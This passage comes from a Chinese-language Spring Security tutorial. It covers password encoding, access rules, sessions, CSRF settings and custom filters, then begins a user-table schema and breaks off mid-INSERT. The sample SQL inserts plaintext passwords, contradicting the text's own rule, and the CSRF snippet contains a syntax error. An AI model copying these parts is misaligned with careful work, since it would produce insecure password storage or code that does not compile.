id="3-6-3-PasswordEncoder-使用步骤"><a href="#3-6-3-PasswordEncoder-使用步骤" class="headerlink" title="3.6.3. PasswordEncoder 使用步骤"></a>3.6.3. PasswordEncoder 使用步骤</h4><p><span style="background:#fff88f">1. 配置 PasswordEncoder</span><br>就是将 <code>PasswordEncoder</code> 声明为一个 Bean，并指定返回一个合适的的实现类。这样当我们注入这个 Bean，并调用其接口方法时，实际执行的就是这个实现类的逻辑，这正体现了 Spring IoC 的核心理念：<strong>面向接口编程，运行时注入实现</strong>。不理解这一点，那确实建议回去复习一下 IoC。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Configuration</span><br><span class="hljs-variable">@EnableWebSecurity</span> <br>public class SecurityConfig &#123;<br>    <span class="hljs-variable">@Bean</span> <br>    public PasswordEncoder <span class="hljs-built_in">passwordEncoder</span>() &#123;<br>        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">BCryptPasswordEncoder</span>(); <span class="hljs-comment">// 返回合适的实现类</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">2. 使用 PasswordEncoder 实现密码加密</span></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@Controller</span>  <br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/security&quot;</span>)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordController</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PasswordEncoder passwordEncoder;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">public</span> PasswordController(PasswordEncoder passwordEncoder) &#123;  <br>        <span class="hljs-keyword">this</span>.passwordEncoder = passwordEncoder;  <br>    &#125;  <br>      <br>    <span class="hljs-comment">// 通过方法处理密码加密  </span><br>    <span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/encode-password&quot;</span>)</span>  <br>    <span class="hljs-meta">@ResponseBody</span>  <br>    <span class="hljs-keyword">public</span> String encodePassword() &#123;  <br>        String password = <span class="hljs-string">&quot;myPasswordxxxxxxx&quot;</span>;  <br>        <span class="hljs-comment">// 在方法内调用 passwordEncoder 进行密码加密  </span><br>        String encodedPassword = passwordEncoder.encode(password);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Encoded Password: &quot;</span> + encodedPassword;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">3. 校验密码匹配</span></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/security&quot;)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordController</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PasswordEncoder passwordEncoder;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PasswordController</span><span class="hljs-params">(PasswordEncoder passwordEncoder)</span> &#123;<br>        <span class="hljs-built_in">this</span>.passwordEncoder = passwordEncoder;<br>    &#125;<br><br>    <span class="hljs-comment">// 通过方法验证密码</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/verify-password&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">verifyPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rawPassword</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;myPasswordxxxxxxx&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodedPassword</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxx&quot;</span>;  <span class="hljs-comment">// 模拟数据库中的加密密码</span><br><br>        <span class="hljs-comment">// 使用 matches 方法验证密码是否匹配</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">matches</span> <span class="hljs-operator">=</span> passwordEncoder.matches(rawPassword, encodedPassword);<br>        <br>        <span class="hljs-keyword">return</span> matches ? <span class="hljs-string">&quot;Password is valid&quot;</span> : <span class="hljs-string">&quot;Invalid password&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>使用 <code>matches</code> 方法时，实际上是<strong>先对 rawPassword 进行加密</strong>，然后再与数据库中的加密密码进行匹配）</li><li>如果我们是使用 <code>AuthenticationManager</code> 进行认证，它会自动将用户发送来的用户名和密码，与我们的 <code>CustomerUserDetailsImpl</code> 中返回的用户名和密码进行比对，这是我们已知的逻辑。那你可能会有疑问：它在比对前，肯定需要先用密码加密器对用户发送来的明文密码进行加密，然后再比对吧？可我并没有做任何相关配置，<code>AuthenticationManager</code> 怎么知道该使用哪个加密器？</li><li>其实，只要你注册了一个类型为 <code>PasswordEncoder</code> 的 接口 Bean，这个 接口 Bean 有一个具体实现，<code>AuthenticationManager</code> 就会知道使用这个 <code>PasswordEncoder</code> Bean 与其具体实现，对密码进行加密，<strong>无需我们手动配置</strong>。</li><li>同样的，只要你注册了一个类型为 <code>UserDetailsService</code> 的 Bean（接口 Bean），这个 接口 Bean 有一个具体的实现，<code>AuthenticationManager</code> 就会知道使用这个 <code>UserDetailsService</code> Bean 与其具体实现，去获取 <code>CustomerUserDetailsImpl</code> <strong>无需我们手动配置</strong>。</li><li>上述，只限于接口 Bean 只有一个具体实现，如果有多个具体实现，那就要我们进行配置了，因为 Spring Security 虽然知道用这个 Bean，但是并不知道使用哪一个具体实现</li></ol></blockquote><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">// 1. 这种方式，同时注册了 UserDetailsService 接口类型的 Bean 和 CustomerUserDetailsImplService 实现类类型的 Bean，CustomerUserDetailsImplService 只是该接口的下的一个具体实现，可能存在多个这样的实现类类型的 Bean（此方式，支持一个接口 Bean 有多个实现类 Bean，当需要切换实现时，只需调整配置，指定使用的实现类即可）</span><br><span class="hljs-variable">@Service</span><br>public class CustomerUserDetailsImplService implements UserDetailsService &#123;<br>......<br>&#125;<br><br><br><span class="hljs-comment">// 2. 这种方式仅注册了 UserDetailsService 类型的 Bean，返回的 CustomerUserDetailsImplService 实例是其具体实现类（此方式下，一个接口 Bean 只能绑定一个实现类，若要更换实现，需在此方法中直接修改返回的实例。）</span><br><span class="hljs-variable">@Bean</span><br>public UserDetailsService <span class="hljs-built_in">userDetailsService</span>() &#123;<br>    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">CustomerUserDetailsImplService</span>();<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="3-7-配置资源级别的访问控制"><a href="#3-7-配置资源级别的访问控制" class="headerlink" title="3.7. 配置资源级别的访问控制"></a>3.7. 配置资源级别的访问控制</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">http</span><span class="hljs-selector-class">.authorizeHttpRequests</span>(auth -&gt; auth<br>    .<span class="hljs-built_in">requestMatchers</span>(<span class="hljs-string">&quot;/public/**&quot;</span>, <span class="hljs-string">&quot;/error&quot;</span>).<span class="hljs-built_in">permitAll</span>()<br>    .<span class="hljs-built_in">requestMatchers</span>(<span class="hljs-string">&quot;/admin/**&quot;</span>).<span class="hljs-built_in">hasRole</span>(<span class="hljs-string">&quot;ADMIN&quot;</span>)<br>    .<span class="hljs-built_in">requestMatchers</span>(<span class="hljs-string">&quot;/manage/**&quot;</span>).<span class="hljs-built_in">hasAuthority</span>(<span class="hljs-string">&quot;MANAGE_PRIVILEGE&quot;</span>)<br>    .<span class="hljs-built_in">requestMatchers</span>(<span class="hljs-string">&quot;/special/**&quot;</span>).<span class="hljs-built_in">access</span>(<span class="hljs-string">&quot;hasRole(&#x27;ADMIN&#x27;) and hasIpAddress(&#x27;192.168.1.0/24&#x27;)&quot;</span>) <br>    .<span class="hljs-built_in">anyRequest</span>().<span class="hljs-built_in">authenticated</span>() <span class="hljs-comment">// 其他所有路径均需经过认证</span><br><span class="hljs-string">&quot;&quot;</span>&quot;<br><span class="hljs-number">1</span>. <span class="hljs-built_in">requestMatchers</span>()：<br><span class="hljs-number">1</span>. 设置 特定资源请求路径 访问控制规则<br><span class="hljs-number">2</span>. <span class="hljs-built_in">anyRequest</span>()：<br><span class="hljs-number">1</span>. 用于设置除上述规则外，其余 所有资源请求路径 的访问控制规则<br><span class="hljs-number">3</span>. <span class="hljs-built_in">permitAll</span>()：<br><span class="hljs-number">1</span>. 允许所有用户访问该资源（说是所有用户，其实你至少要有匿名的 Authentication）<br><span class="hljs-number">4</span>. <span class="hljs-built_in">denyAll</span>()：<br><span class="hljs-number">1</span>. 禁止所有用户访问该资源。<br><span class="hljs-number">5</span>. <span class="hljs-built_in">hasRole</span>()：<br><span class="hljs-number">1</span>. 要求用户必须具备指定角色才能访问<br><span class="hljs-number">2</span>. 注意：该方法会自动在角色名前添加 <span class="hljs-string">&quot;ROLE_&quot;</span> 前缀，即：<span class="hljs-built_in">hasRole</span>(<span class="hljs-string">&quot;ADMIN&quot;</span>) 代表 ROLE_ADMIN<br><span class="hljs-number">6</span>. <span class="hljs-built_in">hasAuthority</span>()：<br><span class="hljs-number">1</span>. 要求用户必须具备指定权限才能访问，我们用这个就好<br><span class="hljs-number">2</span>. 注意：不会自动添加前缀，提供完整权限名称即可<br><span class="hljs-number">7</span>. <span class="hljs-built_in">authenticated</span>()：<br><span class="hljs-number">1</span>. 要求用户已通过身份验证（即非匿名 Authenticated 而是认证 Authenticated）后才能访问。<br><span class="hljs-number">8</span>. <span class="hljs-built_in">access</span>()：<br><span class="hljs-number">1</span>. 支持使用 SpEL 表达式，实现更复杂的访问控制逻辑。<br><span class="hljs-number">2</span>. 例如：<span class="hljs-built_in">access</span>(<span class="hljs-string">&quot;hasRole(&#x27;ADMIN&#x27;) and hasIpAddress(&#x27;192.168.1.0/24&#x27;)&quot;</span>) ，是说此路径仅允许拥有 ADMIN 角色且 IP 地址位于 <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span> 网段的用户访问<br><span class="hljs-string">&quot;&quot;</span>&quot;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>如需放行所有请求，可配置为：</li></ol></blockquote><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">http</span><span class="hljs-selector-class">.authorizeHttpRequests</span>(auth -&gt; auth.<span class="hljs-built_in">anyRequest</span>().<span class="hljs-built_in">permitAll</span>());<br></code></pre></td></tr></table></figure><hr><h3 id="3-8-配置-HttpSession"><a href="#3-8-配置-HttpSession" class="headerlink" title="3.8. 配置 HttpSession"></a>3.8. 配置 HttpSession</h3><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs julia">http.sessionManagement(session -&gt; session  <br>    .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)  <br>    .maximumSessions(<span class="hljs-number">1</span>)<br>    .maxSessionsPreventsLogin(<span class="hljs-literal">true</span>)<br>);<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. sessionCreationPolicy()：会话创建策略</span><br><span class="hljs-string">1. SessionCreationPolicy.ALWAYS：</span><br><span class="hljs-string">1. 始终创建会话。每个请求都会新建一个 HttpSession，覆盖之前的会话，并返回新的 JSESSIONID Cookie。</span><br><span class="hljs-string">2. SessionCreationPolicy.IF_REQUIRED（默认）：</span><br><span class="hljs-string">1. 按需创建会话。当需要使用 HttpSession 时，Spring Security 会自动创建会话，并返回对应的 JSESSIONID Cookie。</span><br><span class="hljs-string">3. SessionCreationPolicy.STATELESS：</span><br><span class="hljs-string">1. 不使用会话，适用于无状态应用场景（禁用 HttpSession，如 JWT）</span><br><span class="hljs-string">2. maximumSessions()：</span><br><span class="hljs-string">1. 并发会话控制。限制每个用户在同一时间内的会话数量，也即用户可在多少台设备上同时登录（默认情况下，不限制）。</span><br><span class="hljs-string">3. maxSessionsPreventsLogin()：</span><br><span class="hljs-string">1. 是否阻止新会话登录。</span><br><span class="hljs-string">2. true：</span><br><span class="hljs-string">1. 达到最大会话数后阻止新会话登录，不允许替换旧会话。</span><br><span class="hljs-string">3. false(默认)：</span><br><span class="hljs-string">1. 允许新会话登录并替换旧会话，此时旧会话将被注销，旧的 JSESSIONID 失效。通常系统会通知用户被挤下线，并重定向到登录页面要求重新登录。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>Spring Security 本身不负责设置 <code>HttpSession</code> 的会话超时时间。会话超时时间由 Servlet 容器或 Spring Boot 配置决定。</li><li><code>HttpSession</code> 存储在服务器端，别误以为存储在用户端了</li><li>如果不希望使用会话，可以配置为：</li></ol></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">http<span class="hljs-selector-class">.sessionManagement</span>()<span class="hljs-selector-class">.sessionCreationPolicy</span>(SessionCreationPolicy.STATELESS);<br></code></pre></td></tr></table></figure><hr><h3 id="3-9-配置-SecurityContextPersistenceFilter-过滤器"><a href="#3-9-配置-SecurityContextPersistenceFilter-过滤器" class="headerlink" title="3.9. 配置 SecurityContextPersistenceFilter 过滤器"></a>3.9. 配置 SecurityContextPersistenceFilter 过滤器</h3><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">// 1. 禁用 SecurityContextPersistenceFilter 过滤器</span><br><span class="hljs-function"><span class="hljs-title">http</span>.securityContext(securityContext -&gt;</span> securityContext.disable())  <br><br><br><span class="hljs-comment">// 2. 启用 线程中的 SecurityContext 保存在 HttpSession 策略</span><br><span class="hljs-function"><span class="hljs-title">http</span>.securityContext(securityContext -&gt;</span> securityContext.requireExplicitSave(<span class="hljs-literal">false</span>));<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>SecurityContextPersistenceFilter</code> 过滤器，能自动将本线程的 <code>SecurityContext</code> 存入 <code>HttpSession</code>（前提是，这个发生变化），但是这个功能，不是默认开启的了，需要我们手动开启</li></ol></blockquote><hr><h3 id="3-10-配置-CSRF-攻击防护"><a href="#3-10-配置-CSRF-攻击防护" class="headerlink" title="3.10. 配置 CSRF 攻击防护"></a>3.10. 配置 CSRF 攻击防护</h3><p>Spring Security 默认启用跨站请求伪造（CSRF）防护机制，基于 <strong>CSRF Token</strong> 实现安全校验。其工作原理如下：</p><ol><li>用户首次登录页面时，需要我们手动生成一个随机的 CSRF Token，将其保存在服务器端的 <strong>HttpSession</strong> 中，并同步返回给前端。</li><li>前端需妥善保存该 Token，在执行修改服务器状态的敏感操作（如 POST、PUT、DELETE、PATCH 等）时，前端必须将该 Token 携带，通常以请求头（默认名称：<code>X-CSRF-TOKEN</code>）或请求参数（名称：<code>_csrf</code>）的方式携带。</li><li>服务器在接收到请求后，会比对请求中携带的 CSRF Token 与存储在 HTTP Session 中的 Token 是否一致。如果两者不匹配或者无 CSRF Token，则会抛出 <code>accessDeniedException</code>（无权限异常），从而阻止非法请求继续执行。</li><li>即使攻击者能利用用户的 Cookie 发起请求，由于敏感操作必须携带合法的 CSRF Token，而攻击者无法获取或伪造该 Token，因而能有效防止 CSRF 攻击。<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">@Bean <br>public CsrfTokenRepository csrfTokenRepository() &#123; <br><br>HttpSessionCsrfTokenRepository repository = <span class="hljs-keyword">new</span> HttpSessionCsrfTokenRepository(); <span class="hljs-comment">// 在HttpSession 中存储</span><br><br>repository.setHeaderName(<span class="hljs-string">&quot;X-CSRF-TOKEN&quot;</span>); <span class="hljs-comment">// 可自定义请求头名称 </span><br>repository.setParameterName(<span class="hljs-string">&quot;_csrfToken&quot;</span>); <span class="hljs-comment">// 可自定义请求参数名称 </span><br><span class="hljs-keyword">return</span> repository; <br>&#125;<br><br>http.csrf(csrf -&gt; csrf<br>.ignoringRequestMatchers(<span class="hljs-string">&quot;/login&quot;</span>,<span class="hljs-string">&quot;/websocket/**&quot;</span>, <span class="hljs-string">&quot;/api/public/**&quot;</span>); <span class="hljs-comment">// 忽略对这些路径的 CSRF 保护</span><br>.csrfTokenRepository(csrfTokenRepository()) <span class="hljs-comment">// 使用我们自定义的 Token 存储库</span><br>)；<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. ignoringRequestMatchers()：</span><br><span class="hljs-string">1. 忽略对这些路径的 CSRF 保护</span><br><span class="hljs-string">2. csrfTokenRepository()：</span><br><span class="hljs-string">1. 指定 Token 的存储库，一般使用我们自定义的 Token 存储库</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果基于 JWT，我们直接禁用 CSRF 防护</li><li>如果你莫名其妙返回 <code>&quot;error&quot;: &quot;权限不足，无法访问此资源&quot;</code> ，大概率是 CSRF 的问题</li><li>如果想要禁用 CSRF 防护，可以配置为：</li></ol></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">http.csrf(csrf -&gt; csrf.<span class="hljs-built_in">disable</span>());<br></code></pre></td></tr></table></figure><hr><h3 id="3-11-添加自定义过滤器"><a href="#3-11-添加自定义过滤器" class="headerlink" title="3.11. 添加自定义过滤器"></a>3.11. 添加自定义过滤器</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 1. 直接添加过滤器，添加的过滤器必须是 Spring Security 提供的过滤器或其子类的实例</span><br>http.<span class="hljs-built_in">addFilter</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">CustomFilter</span>());<br><br><span class="hljs-comment">// 2. 在指定的过滤器位置添加过滤器，新添加的过滤器会替换指定位置的原有过滤器</span><br>http.<span class="hljs-built_in">addFilterAt</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">CustomFilter</span>(),UsernamePasswordAuthenticationFilter.<span class="hljs-keyword">class</span>);<br><br><span class="hljs-comment">// 3. 在指定过滤器之前添加过滤器，自定义过滤器会在指定过滤器之前执行。</span><br>http.<span class="hljs-built_in">addFilterBefore</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">CustomFilter</span>(),UsernamePasswordAuthenticationFilter.<span class="hljs-keyword">class</span>);<br><br><span class="hljs-comment">// 4. 在指定过滤器之后添加过滤器，自定义过滤器会在指定过滤器之后执行。</span><br>http.<span class="hljs-built_in">addFilterAfter</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">CustomFilter</span>(),UsernamePasswordAuthenticationFilter.<span class="hljs-keyword">class</span>);<br></code></pre></td></tr></table></figure><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h2 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h2><h3 id="1-1-基于-HttpSession-的-Spring-Security"><a href="#1-1-基于-HttpSession-的-Spring-Security" class="headerlink" title="1.1. 基于 HttpSession 的 Spring Security"></a>1.1. 基于 HttpSession 的 Spring Security</h3><h4 id="1-1-1-创建-Spring-Web-项目，添加-Security-相关依赖"><a href="#1-1-1-创建-Spring-Web-项目，添加-Security-相关依赖" class="headerlink" title="1.1.1. 创建 Spring Web 项目，添加 Security 相关依赖"></a>1.1.1. 创建 Spring Web 项目，添加 Security 相关依赖</h4><ol><li>Web：<ol><li>Spring Web</li></ol></li><li>Security：<ol><li>Spring Security</li></ol></li><li>SQL<ol><li>JDBC API</li><li>MyBatis Framework</li><li>MySQL Driver</li></ol></li></ol><hr><h4 id="1-1-2-创建用户-角色-权限表"><a href="#1-1-2-创建用户-角色-权限表" class="headerlink" title="1.1.2. 创建用户-角色-权限表"></a>1.1.2. 创建用户-角色-权限表</h4><p>我们一般会创建五个表：<code>users</code> 表（用户表）存储所有注册用户的信息，<code>roles</code> 表（角色表）定义了系统中存在的各种角色，<code>user_role</code> 表（用户-角色关联表）用于建立用户和角色之间的多对多关系，<code>authorities</code> 表（权限表）定义了系统中的各种操作权限，<code>role_authoritie</code> 表（角色-权限表）用于建立角色和权限之间的多对多关系</p><p><span style="background:#fff88f">1. users 表（用户表）</span></p><table><thead><tr><th>列名</th><th>数据类型</th><th>约束</th><th>索引</th><th>默认值</th><th>示例值</th><th>说明</th></tr></thead><tbody><tr><td><strong>user_id</strong></td><td>int</td><td>主键约束、自增属性</td><td>主键索引</td><td>自增</td><td>1</td><td>用户唯一标识符（将 username 直接作为主键也是一种常见做法）</td></tr><tr><td><strong>username</strong></td><td>varchar(20)</td><td>唯一约束</td><td>唯一索引</td><td></td><td>john</td><td>用户名</td></tr><tr><td><strong>password</strong></td><td>varchar(80)</td><td></td><td></td><td></td><td>$2a$10$abcdefghijklmnopqrstuvwxyz</td><td>加密后密码，推荐长度设的长一些，以兼容现代加密算法（禁止明文密码直接入库）</td></tr><tr><td><strong>is_accountNonExpired</strong></td><td>tinyint(1)</td><td></td><td></td><td>1</td><td>1</td><td>账户是否没过期（1 代表没过期）</td></tr><tr><td><strong>is_accountNonLocked</strong></td><td>tinyint(1)</td><td></td><td></td><td>1</td><td>1</td><td>账户是否没锁定</td></tr><tr><td><strong>is_credentialsNonExpired</strong></td><td>tinyint(1)</td><td></td><td></td><td>1</td><td>1</td><td>密码是否没过期</td></tr><tr><td><strong>is_enabled</strong></td><td>tinyint(1)</td><td></td><td></td><td>1</td><td>1</td><td>用户是否启用</td></tr><tr><td><strong>email</strong></td><td>VARCHAR(20)</td><td>唯一约束</td><td>唯一索引</td><td></td><td><a href="mailto:&#x6a;&#x6f;&#104;&#110;&#x40;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#46;&#x63;&#x6f;&#109;">&#x6a;&#x6f;&#104;&#110;&#x40;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#46;&#x63;&#x6f;&#109;</a></td><td>邮箱</td></tr><tr><td><strong>phone_number</strong></td><td>VARCHAR(20)</td><td>唯一约束</td><td>唯一索引</td><td></td><td>13800138000</td><td>电话号码</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 创建表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> users (<br>    user_id <span class="hljs-type">INT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY KEY</span>,<br>    username <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),<br>    <span class="hljs-keyword">password</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">80</span>),<br>    is_accountNonExpired TINYINT(<span class="hljs-number">1</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">1</span>,<br>    is_accountNonLocked TINYINT(<span class="hljs-number">1</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">1</span>,<br>    is_credentialsNonExpired TINYINT(<span class="hljs-number">1</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">1</span>,<br>    is_enabled TINYINT(<span class="hljs-number">1</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">1</span>,<br>    email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),<br>    phone_number <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>)<br>) ENGINE=InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET=utf8mb4;<br><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">CONSTRAINT</span> unique_username <span class="hljs-keyword">UNIQUE</span> (username);<br><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">CONSTRAINT</span> unique_email <span class="hljs-keyword">UNIQUE</span> (email);<br><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">CONSTRAINT</span> unique_phone <span class="hljs-keyword">UNIQUE</span> (phone_number);<br><br><br># <span class="hljs-number">2.</span> 插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, <span class="hljs-keyword">password</span>, email, phone_number)<br><span class="hljs-keyword">VALUES</span><br>    (<span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;pass123&#x27;</span>, <span class="hljs-string">&#x27;alice@example.com&#x27;</span>, <span class="hljs-string">&#x27;13800000000&#x27;</span>),<br>    (<span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;pass456&#x27;</span>, <span class="hljs-string">&#x27;bob@example.com&#x27;</span>, <span class="hljs-string">&#x27;13900000001&#x27;</span>),<br>    (<span class="hljs-string">&#x27;BaTian&#x27;</span>, <span class="hljs-string">&#x27;pass789&#x27;</span>, <span class="hljs-string">&#x27;batian@example.com&#x27;</span>, <span 